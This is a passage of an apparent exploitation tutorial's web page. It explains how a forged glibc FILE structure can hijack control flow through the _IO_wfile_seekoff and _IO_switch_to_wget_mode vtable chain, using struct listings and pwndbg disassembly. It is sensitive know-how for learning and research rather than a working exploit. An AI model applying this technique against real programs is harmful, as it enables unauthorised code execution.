style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_file_jumps_maybe_mmap</span><span style="--0:#24292E;--1:#E1E4E8">        (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_FILE_JUMPS_MAYBE_MMAP])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_wfile_jumps</span><span style="--0:#24292E;--1:#E1E4E8">                  (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_WFILE_JUMPS])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_wfile_jumps_mmap</span><span style="--0:#24292E;--1:#E1E4E8">             (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_WFILE_JUMPS_MMAP])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_wfile_jumps_maybe_mmap</span><span style="--0:#24292E;--1:#E1E4E8">       (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_WFILE_JUMPS_MAYBE_MMAP])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_cookie_jumps</span><span style="--0:#24292E;--1:#E1E4E8">                 (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_COOKIE_JUMPS])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_proc_jumps</span><span style="--0:#24292E;--1:#E1E4E8">                   (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_PROC_JUMPS])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_mem_jumps</span><span style="--0:#24292E;--1:#E1E4E8">                    (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_MEM_JUMPS])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_wmem_jumps</span><span style="--0:#24292E;--1:#E1E4E8">                   (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_WMEM_JUMPS])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_printf_buffer_as_file_jumps</span><span style="--0:#24292E;--1:#E1E4E8">  (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_PRINTF_BUFFER_AS_FILE_JUMPS])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_wprintf_buffer_as_file_jumps</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_WPRINTF_BUFFER_AS_FILE_JUMPS])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_old_file_jumps</span><span style="--0:#24292E;--1:#E1E4E8">               (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_OLD_FILE_JUMPS])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_old_proc_jumps</span><span style="--0:#24292E;--1:#E1E4E8">               (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_OLD_PROC_JUMPS])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_old_cookie_jumps</span><span style="--0:#24292E;--1:#E1E4E8">             (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_OLD_COOKIED_JUMPS])</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="extern const struct _IO_jump_t __io_vtables[] attribute_hidden;#define _IO_str_jumps                    (__io_vtables[IO_STR_JUMPS])#define _IO_wstr_jumps                   (__io_vtables[IO_WSTR_JUMPS])#define _IO_file_jumps                   (__io_vtables[IO_FILE_JUMPS])#define _IO_file_jumps_mmap              (__io_vtables[IO_FILE_JUMPS_MMAP])#define _IO_file_jumps_maybe_mmap        (__io_vtables[IO_FILE_JUMPS_MAYBE_MMAP])#define _IO_wfile_jumps                  (__io_vtables[IO_WFILE_JUMPS])#define _IO_wfile_jumps_mmap             (__io_vtables[IO_WFILE_JUMPS_MMAP])#define _IO_wfile_jumps_maybe_mmap       (__io_vtables[IO_WFILE_JUMPS_MAYBE_MMAP])#define _IO_cookie_jumps                 (__io_vtables[IO_COOKIE_JUMPS])#define _IO_proc_jumps                   (__io_vtables[IO_PROC_JUMPS])#define _IO_mem_jumps                    (__io_vtables[IO_MEM_JUMPS])#define _IO_wmem_jumps                   (__io_vtables[IO_WMEM_JUMPS])#define _IO_printf_buffer_as_file_jumps  (__io_vtables[IO_PRINTF_BUFFER_AS_FILE_JUMPS])#define _IO_wprintf_buffer_as_file_jumps (__io_vtables[IO_WPRINTF_BUFFER_AS_FILE_JUMPS])#define _IO_old_file_jumps               (__io_vtables[IO_OLD_FILE_JUMPS])#define _IO_old_proc_jumps               (__io_vtables[IO_OLD_PROC_JUMPS])#define _IO_old_cookie_jumps             (__io_vtables[IO_OLD_COOKIED_JUMPS])"><div></div></button></div></figure></div>
<h3 id="_io_wfile_seekoff-saves-the-day"><code>_IO_wfile_seekoff</code> saves the day</h3>
<p>So, we have a lot of valid vtables that we can call! This is where the <code>_IO_wfile_seekoff</code> chain comes into action! <code>_IO_wfile_seekoff</code> vtable calls <code>_IO_switch_to_wget_mode</code> which executes  <code>_wide_data-&gt;_wide_vtable-&gt;__overflow</code>. If you don’t know what <code>_wide_data</code> is it’s a struct very similar to <code>_IO_FILE</code> but, with a few differences.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:74ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">/* Extra data for wide character streams.  */</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> _IO_wide_data</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">wchar_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_read_ptr;</span><span style="--0:#616972;--1:#99A0A6">  /* Current read pointer */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">wchar_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_read_end;</span><span style="--0:#616972;--1:#99A0A6">  /* End of get area. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">wchar_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_read_base;</span><span style="--0:#616972;--1:#99A0A6">  /* Start of putback+get area. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">wchar_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_write_base;</span><span style="--0:#616972;--1:#99A0A6">  /* Start of put area. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">wchar_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_write_ptr;</span><span style="--0:#616972;--1:#99A0A6">  /* Current put pointer. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">wchar_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_write_end;</span><span style="--0:#616972;--1:#99A0A6">  /* End of put area. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">wchar_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_buf_base;</span><span style="--0:#616972;--1:#99A0A6">  /* Start of reserve area. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">wchar_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_buf_end;</span><span style="--0:#616972;--1:#99A0A6">    /* End of reserve area. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* The following fields are used to support backing up and undo. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">wchar_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_save_base;</span><span style="--0:#616972;--1:#99A0A6">  /* Pointer to start of non-current get area. */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">wchar_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_backup_base;</span><span style="--0:#616972;--1:#99A0A6">  /* Pointer to first valid character of</span></div></div><div class="ec-line" style="--ecIndent:11ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">           </span></span><span style="--0:#616972;--1:#99A0A6">backup area */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">wchar_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_IO_save_end;</span><span style="--0:#616972;--1:#99A0A6">  /* Pointer to end of non-current get area. */</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">__mbstate_t</span><span style="--0:#24292E;--1:#E1E4E8"> _IO_state;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">__mbstate_t</span><span style="--0:#24292E;--1:#E1E4E8"> _IO_last_state;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> _IO_codecvt _codecvt;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent">  </span><span style="--0:#005CC5;--1:#79B8FF">wchar_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#AE4B07;--1:#FFAB70">_shortbuf</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">];</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code">
</div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">const</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">_IO_jump_t</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">_wide_vtable;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">};</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="/* Extra data for wide character streams.  */struct _IO_wide_data{  wchar_t *_IO_read_ptr;  /* Current read pointer */  wchar_t *_IO_read_end;  /* End of get area. */  wchar_t *_IO_read_base;  /* Start of putback+get area. */  wchar_t *_IO_write_base;  /* Start of put area. */  wchar_t *_IO_write_ptr;  /* Current put pointer. */  wchar_t *_IO_write_end;  /* End of put area. */  wchar_t *_IO_buf_base;  /* Start of reserve area. */  wchar_t *_IO_buf_end;    /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  wchar_t *_IO_save_base;  /* Pointer to start of non-current get area. */  wchar_t *_IO_backup_base;  /* Pointer to first valid character of           backup area */  wchar_t *_IO_save_end;  /* Pointer to end of non-current get area. */  __mbstate_t _IO_state;  __mbstate_t _IO_last_state;  struct _IO_codecvt _codecvt;  wchar_t _shortbuf[1];  const struct _IO_jump_t *_wide_vtable;};"><div></div></button></div></figure></div>
<p><code>_IO_wfile_seekoff</code> calls <code>_IO_switch_to_wget_mode</code> with first argument <code>rdi</code> set to the file structs beginning.</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:84ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">disas</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">_IO_wfile_seekoff</span></div></div><div class="ec-line"><div class="code"><span style="--0:#005CC5;--1:#79B8FF">..</span><span style="--0:#032F62;--1:#9ECBFF">.SNIP.</span><span style="--0:#005CC5;--1:#79B8FF">..</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x00007ffff7c8d2e5</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+101&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">mov</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">rdi,r13</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x00007ffff7c8d2e8</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+104&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">call</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#005CC5;--1:#79B8FF">0x7ffff7c8afb0</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;__GI__IO_switch_to_wget_mode&gt;</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> disas _IO_wfile_seekoff...SNIP...   0x00007ffff7c8d2e5 <+101>:   mov    rdi,r13   0x00007ffff7c8d2e8 <+104>:   call   0x7ffff7c8afb0 <__GI__IO_switch_to_wget_mode>"><div></div></button></div></figure></div>
<p><code>_IO_switch_to_wget_mode</code> loads our fake FILE’s <code>_wide_data</code> pointer into <code>rax</code>, then dereferences <code>rax+0xe0</code> to get the <code>_wide_vtable</code> address, and finally calls the function pointer at <code>_wide_vtable+0x18</code> (<code>__overflow</code>).</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:63ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">disas</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">_IO_switch_to_wget_mode</span></div></div><div class="ec-line"><div class="code"><span style="--0:#005CC5;--1:#79B8FF">..</span><span style="--0:#032F62;--1:#9ECBFF">.SNIP.</span><span style="--0:#005CC5;--1:#79B8FF">..</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x00007ffff7c8afc0</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+16&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">mov</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">rax,QWORD</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">PTR</span><span style="--0:#24292E;--1:#E1E4E8"> [rdi+0xa0]</span></div></div><div class="ec-line"><div class="code"><span style="--0:#005CC5;--1:#79B8FF">..</span><span style="--0:#032F62;--1:#9ECBFF">.SNIP.</span><span style="--0:#005CC5;--1:#79B8FF">..</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x00007ffff7c8afd1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+33&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">mov</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">rax,QWORD</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">PTR</span><span style="--0:#24292E;--1:#E1E4E8"> [rax+0xe0]</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="code"><span class="indent">   </span><span style="--0:#6F42C1;--1:#B392F0">0x00007ffff7c8afdd</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&lt;+45&gt;:</span><span style="--0:#24292E;--1:#E1E4E8">    </span><span style="--0:#032F62;--1:#9ECBFF">call</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">QWORD</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">PTR</span><span style="--0:#24292E;--1:#E1E4E8"> [rax+0x18]</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> disas _IO_switch_to_wget_mode...SNIP...   0x00007ffff7c8afc0 <+16>:    mov    rax,QWORD PTR [rdi+0xa0]...SNIP...   0x00007ffff7c8afd1 <+33>:    mov    rax,QWORD PTR [rax+0xe0]   0x00007ffff7c8afdd <+45>:    call   QWORD PTR [rax+0x18]"><div></div></button></div></figure></div>
<p>So, in a nutshell <code>*(*(fp-&gt;_wide_data + 0xe0) + 0x18)</code> is being called! One important thing to know here is the reason why <code>_IO_switch_to_wget_mode</code> adds <code>0x18</code> to rax before calling the dereferenced function? The reason is because the data type of <code>_wide_vtable</code> is <code>_IO_jump_t</code> which is defined as follows:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:47ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">_IO_jump_t</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">size_t</span><span style="--0:#24292E;--1:#E1E4E8">, __dummy);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">size_t</span><span style="--0:#24292E;--1:#E1E4E8">, __dummy2);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_finish_t</span><span style="--0:#24292E;--1:#E1E4E8">, __finish);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_overflow_t</span><span style="--0:#24292E;--1:#E1E4E8">, __overflow);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_underflow_t</span><span style="--0:#24292E;--1:#E1E4E8">, __underflow);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_underflow_t</span><span style="--0:#24292E;--1:#E1E4E8">, __uflow);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_pbackfail_t</span><span style="--0:#24292E;--1:#E1E4E8">, __pbackfail);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">    </span></span><span style="--0:#616972;--1:#99A0A6">/* showmany */</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_xsputn_t</span><span style="--0:#24292E;--1:#E1E4E8">, __xsputn);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_xsgetn_t</span><span style="--0:#24292E;--1:#E1E4E8">, __xsgetn);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_seekoff_t</span><span style="--0:#24292E;--1:#E1E4E8">, __seekoff);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_seekpos_t</span><span style="--0:#24292E;--1:#E1E4E8">, __seekpos);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_setbuf_t</span><span style="--0:#24292E;--1:#E1E4E8">, __setbuf);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_FIELD</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">_IO_sync_t</span><span style="--0:#24292E;--1:#E1E4E8">, __sync);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent">    </span><span 